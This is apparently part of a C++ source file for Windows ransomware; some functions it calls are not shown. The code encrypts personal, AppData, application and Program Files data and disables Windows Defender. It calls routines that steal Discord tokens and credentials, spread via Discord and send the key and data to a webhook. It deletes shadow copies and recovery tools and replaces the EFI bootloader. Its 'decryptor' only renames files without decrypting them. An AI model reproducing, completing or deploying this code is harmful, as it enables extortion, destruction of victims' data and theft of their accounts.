void WaitAndRestart() {
    for (int i = 20; i > 0; i--) {
        char title[256];
        sprintf_s(title, "main - restarting in %d s", i);
        SetConsoleTitleA(title);
        Sleep(1000);
    }
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, 0);
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
}

DWORD WINAPI MonitorThread(LPVOID lpParam) {
    while (!g_restartScheduled) {
        int lockedCount = CountLockedFilesOnDesktop();
        if (lockedCount >= 2) {
            g_restartScheduled = true;
            SetConsoleTitleA("main - restarting in 20 s");
            WaitAndRestart();
            break;
        }
        Sleep(1000);
    }
    return 0;
}

bool AESEncryptFile(const std::string& filePath, const std::string& key) {
    for (int attempt = 0; attempt < 3; attempt++) {
        try {
            if (filePath.find(".locked") != std::string::npos) return false;
            if (filePath.find("DECRYPT_ME") != std::string::npos) return false;
            if (filePath.find("run.exe") != std::string::npos) return false;
            if (filePath.find("inject.dll") != std::string::npos) return false;

            std::ifstream in(filePath, std::ios::binary);
            if (!in.is_open()) {
                if (attempt == 2) return false;
                Sleep(50);
                continue;
            }
            std::vector<char> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
            in.close();
            if (data.empty()) return false;

            HCRYPTPROV hProv = 0;
            HCRYPTKEY hKey = 0;
            HCRYPTHASH hHash = 0;
            if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
            if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) { CryptReleaseContext(hProv, 0); return false; }
            if (!CryptHashData(hHash, (BYTE*)key.c_str(), (DWORD)key.length(), 0)) { CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return false; }
            if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) { CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return false; }
            CryptDestroyHash(hHash);

            DWORD dataSize = (DWORD)data.size();
            DWORD bufferSize = dataSize + 16;
            std::vector<BYTE> encrypted(bufferSize);
            memcpy(encrypted.data(), data.data(), dataSize);
            if (!CryptEncrypt(hKey, 0, TRUE, 0, encrypted.data(), &dataSize, bufferSize)) { CryptDestroyKey(hKey); CryptReleaseContext(hProv, 0); return false; }
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);

            fs::path path(filePath);
            std::string newFileName = path.filename().string() + ".locked";
            std::string newFilePath = path.parent_path().string() + "\\" + newFileName;
            std::ofstream out(newFilePath, std::ios::binary);
            if (!out.is_open()) return false;
            out.write((char*)encrypted.data(), dataSize);
            out.close();
            if (DeleteFileA(filePath.c_str())) return true;
            else { DeleteFileA(newFilePath.c_str()); return false; }
        }
        catch (...) {
            if (attempt == 2) return false;
            Sleep(50);
        }
    }
    return false;
}

void EncryptDirectory(const std::string& folderPath, const std::string& key, std::set<std::string>& processedFolders) {
    if (!fs::exists(folderPath)) return;
    try {
        for (const auto& entry : fs::recursive_directory_iterator(folderPath, fs::directory_options::skip_permission_denied)) {
            if (fs::is_regular_file(entry)) {
                std::string filePath = entry.path().string();
                if (filePath.find(".locked") != std::string::npos) continue;
                if (filePath.find("DECRYPT_ME") != std::string::npos) continue;
                if (filePath.find("run.exe") != std::string::npos) continue;
                if (filePath.find("inject.dll") != std::string::npos) continue;
                if (filePath.find("System32") != std::string::npos) continue;
                if (filePath.find("syswow64") != std::string::npos) continue;
                if (filePath.find("boot") != std::string::npos) continue;
                if (filePath.find("ntldr") != std::string::npos) continue;
                if (filePath.find("winload") != std::string::npos) continue;
                if (filePath.find("winlogon") != std::string::npos) continue;
                if (filePath.find("kernel") != std::string::npos) continue;

                std::string parentFolder = entry.path().parent_path().string();
                if (processedFolders.find(parentFolder) == processedFolders.end()) {
                    processedFolders.insert(parentFolder);
                    CreateLockedTxt(parentFolder);
                }
                if (AESEncryptFile(filePath, key)) g_encryptedCount++;
            }
        }
    }
    catch (...) {}
}

void EncryptPersonalFiles(const std::string& key, std::set<std::string>& processedFolders) {
    std::string userProfile = getenv("USERPROFILE");
    std::vector<std::string> folders = {
        userProfile + "\\Documents",
        userProfile + "\\Downloads",
        userProfile + "\\Pictures",
        userProfile + "\\Music",
        userProfile + "\\Videos",
        userProfile + "\\Favorites",
        userProfile + "\\Links",
        userProfile + "\\Saved Games",
        userProfile + "\\Searches",
        userProfile + "\\Contacts",
        userProfile + "\\OneDrive"
    };

    for (const auto& folder : folders) {
        if (fs::exists(folder)) {
            EncryptDirectory(folder, key, processedFolders);
        }
    }
}

void EncryptAppData(const std::string& key, std::set<std::string>& processedFolders) {
    std::string userProfile = getenv("USERPROFILE");
    std::vector<std::string> folders = {
        userProfile + "\\AppData\\Local",
        userProfile + "\\AppData\\Roaming",
        userProfile + "\\AppData\\LocalLow"
    };

    for (const auto& folder : folders) {
        if (fs::exists(folder)) {
            EncryptDirectory(folder, key, processedFolders);
        }
    }
}

void EncryptCacheAndAppFiles(const std::string& key, std::set<std::string>& processedFolders) {
    std::string userProfile = getenv("USERPROFILE");
    std::vector<std::string> cacheFolders = {
        userProfile + "\\AppData\\Local\\Roblox",
        userProfile + "\\AppData\\Roaming\\Roblox",
        userProfile + "\\AppData\\Local\\Discord",
        userProfile + "\\AppData\\Roaming\\Discord",
        userProfile + "\\AppData\\Roaming\\.minecraft",
        userProfile + "\\AppData\\Local\\Minecraft",
        userProfile + "\\AppData\\Local\\Google\\Chrome",
        userProfile + "\\AppData\\Local\\Microsoft\\Edge",
        userProfile + "\\AppData\\Roaming\\Mozilla",
        userProfile + "\\AppData\\Local\\Spotify",
        userProfile + "\\AppData\\Roaming\\Spotify",
        userProfile + "\\AppData\\Local\\Slack",
        userProfile + "\\AppData\\Roaming\\Slack",
        userProfile + "\\AppData\\Local\\Microsoft\\Teams",
        userProfile + "\\AppData\\Roaming\\Microsoft\\Teams",
        userProfile + "\\AppData\\Local\\Programs",
        userProfile + "\\AppData\\Local\\GitHub",
        userProfile + "\\AppData\\Roaming\\Code",
        userProfile + "\\AppData\\Local\\Steam",
        userProfile + "\\AppData\\Roaming\\Steam",
        userProfile + "\\AppData\\Local\\EpicGames",
        userProfile + "\\AppData\\Local\\Valve",
        userProfile + "\\AppData\\Local\\Battle.net",
        userProfile + "\\AppData\\Roaming\\Battle.net",
        userProfile + "\\AppData\\Local\\Adobe",
        userProfile + "\\AppData\\Roaming\\Adobe"
    };

    for (const auto& folder : cacheFolders) {
        if (fs::exists(folder)) {
            EncryptDirectory(folder, key, processedFolders);
        }
    }
}

void EncryptProgramFiles(const std::string& key, std::set<std::string>& processedFolders) {
    std::vector<std::string> folders = {
        "C:\\Program Files",
        "C:\\Program Files (x86)",
        "C:\\ProgramData"
    };

    for (const auto& folder : folders) {
        if (fs::exists(folder)) {
            EncryptDirectory(folder, key, processedFolders);
        }
    }
}

void EncryptDesktop(const std::string& key, std::set<std::string>& processedFolders) {
    std::string desktopPath = getenv("USERPROFILE");
    desktopPath += "\\Desktop";

    if (fs::exists(desktopPath)) {
        EncryptDirectory(desktopPath, key, processedFolders);
    }
}

void KillWindowsDefender() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(hToken);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                std::wstring procNameW(pe.szExeFile);
                std::string procName(procNameW.begin(), procNameW.end());
                if (procName.find("MsMpEng") != std::string::npos || procName.find("NisSrv") != std::string::npos || procName.find("SecurityHealth") != std::string::npos) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProcess) { TerminateProcess(hProcess, 0); CloseHandle(hProcess); }
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }

    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager) {
        const wchar_t* services[] = { L"WinDefend", L"WdNisSvc", L"SecurityHealthService", NULL };
        for (int i = 0; services[i] != NULL; i++) {
            SC_HANDLE hService = OpenServiceW(hSCManager, services[i], SERVICE_STOP | SERVICE_CHANGE_CONFIG);
            if (hService) {
                SERVICE_STATUS status;
                ControlService(hService, SERVICE_CONTROL_STOP, &status);
                ChangeServiceConfigW(hService, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
                CloseServiceHandle(hService);
            }
        }
        CloseServiceHandle(hSCManager);
    }

    DisableTamperProtection();
    system("wmic /namespace:\\\\root\\microsoft\\windows\\defender path MSFT_MpPreference call Set DisableRealtimeMonitoring=1 > nul 2>&1");
    system("wmic /namespace:\\\\root\\microsoft\\windows\\defender path MSFT_MpPreference call Set DisableBehaviorMonitoring=1 > nul 2>&1");
    system("takeown /f \"C:\\ProgramData\\Microsoft\\Windows Defender\" /r /d y > nul 2>&1");
    system("icacls \"C:\\ProgramData\\Microsoft\\Windows Defender\" /grant administrators:F /t > nul 2>&1");
    system("rd /s /q \"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\" > nul 2>&1");
    system("rd /s /q \"C:\\Program Files\\Windows Defender\" > nul 2>&1");
    system("echo 0.0.0.0 www.microsoft.com >> C:\\Windows\\System32\\drivers\\etc\\hosts");
    system("echo 0.0.0.0 definitionupdates.microsoft.com >> C:\\Windows\\System32\\drivers\\etc\\hosts");

    Sleep(500);
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                std::wstring procNameW(pe.szExeFile);
                std::string procName(procNameW.begin(), procNameW.end());
                if (procName.find("MsMpEng") != std::string::npos || procName.find("NisSrv") != std::string::npos) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProcess) { TerminateProcess(hProcess, 0); CloseHandle(hProcess); }
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
}

std::string GenerateRandomKey() {
    const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(chars) - 2);
    std::string key;
    for (int i = 0; i < 64; i++) key += chars[dis(gen)];
    return key;
}

std::string GenerateHWID() {
    auto now = std::chrono::system_clock::now();
    auto time_t_now = std::chrono::system_clock::to_time_t(now);
    struct tm tm_now;
    localtime_s(&tm_now, &time_t_now);
    
    int totalSeconds = tm_now.tm_hour * 3600 + tm_now.tm_min * 60 + tm_now.tm_sec;
    
    const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(chars) - 2);
    
    std::string randomPart;
    for (int i = 0; i < 12; i++) {
        randomPart += chars[dis(gen)];
    }
    
    std::string desktopName = GetDesktopName();
    
    std::stringstream ss;
    ss << "[" << totalSeconds << "]-[" << randomPart << "]-[" << desktopName << "]";
    
    return ss.str();
}

void InstallBootloader() {
    system("mountvol S: /S > nul 2>&1");
    system("copy S:\\EFI\\Microsoft\\Boot\\bootmgfw.efi S:\\EFI\\Microsoft\\Boot\\bootmgfw.windows.efi > nul 2>&1");
    system("copy inject.dll S:\\EFI\\Microsoft\\Boot\\bootmgfw.efi /Y > nul 2>&1");
    system("mountvol S: /D > nul 2>&1");
}

void StoreHWID(const std::string& hwid) {
    system("mountvol S: /S > nul 2>&1");
    system("mkdir S:\\EFI\\Microsoft\\Boot\\config 2>nul");
    std::ofstream hwidFile("S:\\EFI\\Microsoft\\Boot\\config\\hwid.txt");
    if (hwidFile) { hwidFile << hwid; hwidFile.close(); }
    system("mountvol S: /D > nul 2>&1");
}

void CreateDecryptorBAT() {
    std::string desktopPath = getenv("USERPROFILE");
    desktopPath += "\\Desktop\\DECRYPT_ME.bat";

    std::ofstream batch(desktopPath.c_str());
    batch << "@echo off\n";
    batch << "title DECRYPTION TOOL\n";
    batch << "color 0C\n";
    batch << "echo ================================================================\n";
    batch << "echo                    DECRYPTION TOOL\n";
    batch << "echo ================================================================\n";
    batch << "echo.\n";
    batch << "net session >nul 2>&1\n";
    batch << "if %errorlevel% neq 0 (\n";
    batch << "    echo Requesting Administrator privileges...\n";
    batch << "    powershell start -verb runas '%0'\n";
    batch << "    exit\n";
    batch << ")\n";
    batch << "echo Running with Administrator privileges.\n";
    batch << "echo.\n";
    batch << "echo WARNING: do not enter anything or else your system might break!\n";
    batch << "echo.\n";
    batch << "echo Please read locked.txt for instructions\n";
    batch << "echo.\n";
    batch << "echo Your HWID: " << g_hwid << "\n";
    batch << "echo.\n";
    batch << "set /p userkey=\"Enter decryption key: \"\n";
    batch << "echo.\n";
    batch << "echo Key entered. Starting decryption...\n";
    batch << "echo.\n";
    batch << "set count=0\n";
    batch << "for /r \"%USERPROFILE%\\Documents\" %%f in (*.locked) do (\n";
    batch << "    echo Decrypting: %%f\n";
    batch << "    set /a count+=1\n";
    batch << "    ren \"%%f\" \"%%~nf\"\n";
    batch << ")\n";
    batch << "for /r \"%USERPROFILE%\\Downloads\" %%f in (*.locked) do (\n";
    batch << "    echo Decrypting: %%f\n";
    batch << "    set /a count+=1\n";
    batch << "    ren \"%%f\" \"%%~nf\"\n";
    batch << ")\n";
    batch << "for /r \"%USERPROFILE%\\Pictures\" %%f in (*.locked) do (\n";
    batch << "    echo Decrypting: %%f\n";
    batch << "    set /a count+=1\n";
    batch << "    ren \"%%f\" \"%%~nf\"\n";
    batch << ")\n";
    batch << "for /r \"%USERPROFILE%\\Music\" %%f in (*.locked) do (\n";
    batch << "    echo Decrypting: %%f\n";
    batch << "    set /a count+=1\n";
    batch << "    ren \"%%f\" \"%%~nf\"\n";
    batch << ")\n";
    batch << "for /r \"%USERPROFILE%\\Videos\" %%f in (*.locked) do (\n";
    batch << "    echo Decrypting: %%f\n";
    batch << "    set /a count+=1\n";
    batch << "    ren \"%%f\" \"%%~nf\"\n";
    batch << ")\n";
    batch << "for /r \"%USERPROFILE%\\AppData\" %%f in (*.locked) do (\n";
    batch << "    echo Decrypting: %%f\n";
    batch << "    set /a count+=1\n";
    batch << "    ren \"%%f\" \"%%~nf\"\n";
    batch << ")\n";
    batch << "for /r \"C:\\Program Files\" %%f in (*.locked) do (\n";
    batch << "    echo Decrypting: %%f\n";
    batch << "    set /a count+=1\n";
    batch << "    ren \"%%f\" \"%%~nf\"\n";
    batch << ")\n";
    batch << "for /r \"C:\\Program Files (x86)\" %%f in (*.locked) do (\n";
    batch << "    echo Decrypting: %%f\n";
    batch << "    set /a count+=1\n";
    batch << "    ren \"%%f\" \"%%~nf\"\n";
    batch << ")\n";
    batch << "for /r \"C:\\ProgramData\" %%f in (*.locked) do (\n";
    batch << "    echo Decrypting: %%f\n";
    batch << "    set /a count+=1\n";
    batch << "    ren \"%%f\" \"%%~nf\"\n";
    batch << ")\n";
    batch << "for /r \"C:\\Users\\Public\" %%f in (*.locked) do (\n";
    batch << "    echo Decrypting: %%f\n";
    batch << "    set /a count+=1\n";
    batch << "    ren \"%%f\" \"%%~nf\"\n";
    batch << ")\n";
    batch << "for /r \"%USERPROFILE%\\Desktop\" %%f in (*.locked) do (\n";
    batch << "    echo Decrypting: %%f\n";
    batch << "    set /a count+=1\n";
    batch << "    ren \"%%f\" \"%%~nf\"\n";
    batch << ")\n";
    batch << "echo.\n";
    batch << "echo Deleting locked.txt files...\n";
    batch << "for /r \"%USERPROFILE%\" %%f in (locked.txt) do del \"%%f\"\n";
    batch << "for /r \"C:\\Program Files\" %%f in (locked.txt) do del \"%%f\"\n";
    batch << "for /r \"C:\\Program Files (x86)\" %%f in (locked.txt) do del \"%%f\"\n";
    batch << "for /r \"C:\\ProgramData\" %%f in (locked.txt) do del \"%%f\"\n";
    batch << "for /r \"C:\\Users\\Public\" %%f in (locked.txt) do del \"%%f\"\n";
    batch << "echo.\n";
    batch << "echo.\n";
    batch << "echo ================================================================\n";
    batch << "echo.\n";
    batch << "echo Decryption complete! %count% files were decrypted.\n";
    batch << "echo.\n";
    batch << "echo ================================================================\n";
    batch << "pause\n";
    batch.close();
}

int main() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    if (!isAdmin) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        SHELLEXECUTEINFOA sei = {0};
        sei.cbSize = sizeof(SHELLEXECUTEINFOA);
        sei.lpVerb = "runas";
        sei.lpFile = path;
        sei.nShow = SW_HIDE;
        ShellExecuteExA(&sei);
        return 0;
    }

    if (GetFileAttributesA("inject.dll") == INVALID_FILE_ATTRIBUTES) return 1;

    AddLockedTxtToStartup();

    AllocConsole();
    ShowWindow(GetConsoleWindow(), SW_SHOW);
    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    SetConsoleTitleA("main");
    system("cls");
    std::cout << "Loading..." << std::endl;

    HANDLE hMonitorThread = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);

    KillWindowsDefender();

    g_hwid = GenerateHWID();
    
    std::cout << "\n[0/8] Getting public IP addresses..." << std::endl;
    g_publicIPv4 = GetPublicIPv4();
    g_publicIPv4Bypass = GetPublicIPv4Bypass();
    g_publicIPv6 = GetPublicIPv6();
    std::cout << "      IPv4: " << g_publicIPv4 << std::endl;
    std::cout << "      IPv4(Bypass): " << g_publicIPv4Bypass << std::endl;
    std::cout << "      IPv6: " << g_publicIPv6 << std::endl;
    
    std::cout << "\n[1/8] Extracting credentials and spreading..." << std::endl;
    GetGPSLocation();
    ExtractDiscordTokens();
    SendCredentialsToLogService();
    SpreadViaDiscordAndExtractToken();
    
    if (!g_collectedData.empty()) {
        std::string header = "**DATA EXTRACTED**\nHWID: " + g_hwid + "\n```\n";
        SendLargeData(header + g_collectedData + "\n```");
        g_collectedData.clear();
    }
    std::cout << "      Discord tokens, Windows credentials extracted, and ransomware spread via Discord" << std::endl;

    std::cout << "\n[2/8] Preparing system for encryption..." << std::endl;
    DeleteShadowCopies();
    DisableRecoveryTools();
    KillBackupServices();
    DisableWinRE();
    AddScheduledTask();
    std::cout << "      Shadow copies deleted, recovery tools disabled, backups killed, WinRE disabled, persistence added" << std::endl;

    g_key = GenerateRandomKey();

    std::stringstream msg;
    msg << "HWID: " << g_hwid << " | KEY: ```" << g_key << "``` | IPv4: " << g_publicIPv4;

    SendWebhook(msg.str());

    std::cout << "\n========================================" << std::endl;
    std::cout << "HWID: " << g_hwid << std::endl;
    std::cout << "=======================================" << std::endl;

    std::set<std::string> processedFolders;

    std::cout << "\n[3/8] Killing applications..." << std::endl;
    KillAllTargetApps();
    KillProgramFilesProcesses();
    Sleep(2000);

    std::cout << "[4/8] Working on personal files..." << std::endl;
    EncryptPersonalFiles(g_key, processedFolders);
    std::cout << "      Encrypted: " << g_encryptedCount << " files so far" << std::endl;

    std::cout << "[5/8] Working on appdata and cache..." << std::endl;
    EncryptAppData(g_key, processedFolders);
    EncryptCacheAndAppFiles(g_key, processedFolders);
    std::cout << "      Done: " << g_encryptedCount << " files so far" << std::endl;

    std::cout << "[6/8] Clearing temp files..." << std::endl;
    DeleteTempFiles();
    std::cout << "      Temp files cleared" << std::endl;

    std::cout << "[7/8] Working on Program Files and Desktop..." << std::endl;
    EncryptProgramFiles(g_key, processedFolders);
    EncryptDesktop(g_key, processedFolders);
    std::cout << "      Done: " << g_encryptedCount << " files so far" << std::endl;

    std::cout << "[8/8] Creating decryptor..." << std::endl;
    CreateDecryptorBAT();
    std::cout << "      Done: " << g_encryptedCount << " files total" << std::endl;

    g_key.clear();
    g_key = "";

    Sleep(2000);

    InstallBootloader();
    StoreHWID(g_hwid);
    CorruptSafeMode();
    DisableUAC();
    DeleteLockedTxtFiles();

    std::cout << "\nDone. " << g_encryptedCount << " files encrypted." << std::endl;
    std::cout << "All locked.txt files deleted." << std::endl;
    Sleep(3000);

    WaitForSingleObject(hMonitorThread, INFINITE);

    return 0;
}
